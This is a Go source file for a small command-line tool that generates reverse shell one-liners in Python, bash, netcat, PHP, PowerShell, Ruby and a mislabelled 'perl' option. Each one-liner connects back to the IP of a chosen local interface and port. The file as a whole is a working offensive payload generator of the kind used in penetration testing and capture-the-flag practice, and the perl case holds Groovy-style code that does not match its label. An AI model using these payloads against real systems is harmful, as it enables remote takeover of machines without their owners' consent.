package main

import (
	"fmt"
	"net"
	"os"
)

const (
	py         string = "py"
	bash       string = "bash"
	netcat     string = "nc"
	php        string = "php"
	powershell string = "ps"
	perl       string = "pl"
	ruby       string = "rb"
	all        string = "all"
)

func main() {
	// Only work on linux
	if len(os.Args) > 3 {
		shell := os.Args[1]      // python, bash, perl, ruby, php, powershell.
		interfaces := os.Args[2] // interfaces
		port := os.Args[3]
		crafted := craftReverseShell(shell, interfaces, port)
		fmt.Print(crafted)
		return
	}
	fmt.Printf("Usage:\n\tmkrev [shell] [interface] [port]")
	fmt.Printf("\n\tmkrev py tun0 9000 \n")
	fmt.Printf("Shell:\n\tpy, bash, nc, php, ps, pl, rb \n")
}

func craftReverseShell(shell, interfaces, port string) string {
	ip, ok := checkInterfaces(interfaces)
	if !ok {
		fmt.Println("Wrong interfaces")
		os.Exit(1)
	}

	switch shell {
	case py:
		return fmt.Sprintf(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`,
			ip, port)
	case bash:
		return fmt.Sprintf(`bash -c "bash -i >& /dev/tcp/%s/%s 0>&1"`, ip, port)
	case netcat:
		return fmt.Sprintf(`nc -e /bin/sh %s %s`, ip, port)
	case php:
		return fmt.Sprintf(`php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'`, ip, port)
	case powershell:
		return fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, ip, port)
	case perl:
		return fmt.Sprintf(`r = Runtime.getRuntime()
		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
		p.waitFor()`, ip, port)
	case ruby:
		return fmt.Sprintf(`ruby -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`, ip, port)
	default:
		return fmt.Sprint("Me dumb :(")
	}
}
func checkInterfaces(name string) (string, bool) {
	listInterfaces, _ := net.Interfaces()

	for _, ifs := range listInterfaces {
		if name == ifs.Name {
			listAddr, _ := ifs.Addrs()
			ip := listAddr[0].String()
			return ip[:len(ip)-3], true
		}
		continue
	}
	return "", false
}
